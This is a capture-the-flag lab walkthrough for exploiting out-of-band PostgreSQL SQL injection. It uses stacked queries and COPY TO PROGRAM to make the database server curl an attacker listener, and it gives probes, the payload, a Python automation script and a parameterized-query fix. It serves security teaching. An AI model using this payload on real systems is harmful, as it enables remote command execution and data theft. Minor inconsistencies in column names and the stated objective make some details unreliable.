# Level 3-1: Out-of-Band SQLi via COPY TO PROGRAM

**URL:** `/oob`

**Objective:** Exfiltrate the flag from the `cofre` table by sending an HTTP request to an attacker-controlled listener using PostgreSQL's `COPY TO PROGRAM` directive. The flag never appears in the HTTP response. The path of the request to your listener reveals the next level URL.

## Vulnerable Code

```python
query = f"SELECT nome, alcunha FROM olheiros WHERE id = {scout_id}"
cur.execute(query)
```

The `id` parameter is injected directly into a numeric context with no quotes and no parameterization. The connection uses `autocommit=True`, which makes psycopg3 use PostgreSQL's Simple Query protocol — this allows multiple statements separated by `;` in a single `execute()` call.

The DB user is a PostgreSQL SUPERUSER, which is required for `COPY TO PROGRAM`.

## Why COPY TO PROGRAM Works Here

`COPY (SELECT ...) TO PROGRAM 'shell command'` executes the shell command on the database server and pipes the query result to its stdin. This is a PostgreSQL superuser-only feature designed for bulk data export. Here it is abused to exfiltrate data via an OS-level network call.

## Attack Chain

### Step 1 — Confirm injection

```
id=1 AND 1=1--
```

Returns the scout record. Injection is numeric (no quotes needed).

```
id=1 AND 1=2--
```

Returns no record. Injection confirmed.

### Step 2 — Start a listener on your machine

```bash
python3 -m http.server 9000
```

The PostgreSQL server (inside Docker) will curl to `host.docker.internal:9000`, which resolves to your host machine thanks to the `extra_hosts: host-gateway` mapping in `compose.yml`.

### Step 3 — Inject the stacked COPY payload

```
id=1; COPY (SELECT '') TO PROGRAM 'curl http://host.docker.internal:9000/waf'
```

The injected SQL becomes:

```sql
SELECT nome, posicao FROM olheiros WHERE id = 1;
COPY (SELECT '') TO PROGRAM 'curl http://host.docker.internal:9000/waf'
```

Two statements execute. The first SELECT returns the scout info (normal response). The second `COPY` sends a GET request to your listener. The path `/waf` in the URL is the hint to the next level. The browser will show an error — this is expected, and it's what triggers the congrats banner.

### Step 4 — Read the path from the listener output

```
127.0.0.1 - - [10/May/2026 ...] "GET /waf HTTP/1.1" 200 -
```

The path `/waf` tells you the next level URL. The congrats banner appears automatically on the page.

### Example automation script

File available at: `backend/scripts/script-3_1.py`

```python
import requests

LISTENER_PORT = 9000
payload = f"1; COPY (SELECT '') TO PROGRAM 'curl http://host.docker.internal:{LISTENER_PORT}/waf'"
r = requests.get('http://localhost/api/oob', params={'id': payload})
print(r.status_code, r.text)
# Path /waf arrives on your listener — navigate to http://localhost/waf
```

## Fixed Code

```python
query = "SELECT nome, alcunha FROM olheiros WHERE id = %s"
cur.execute(query, (scout_id,))
```

Parameterized queries use the Extended Query protocol, which prevents stacked statements. Additionally, avoid granting SUPERUSER to application database users.
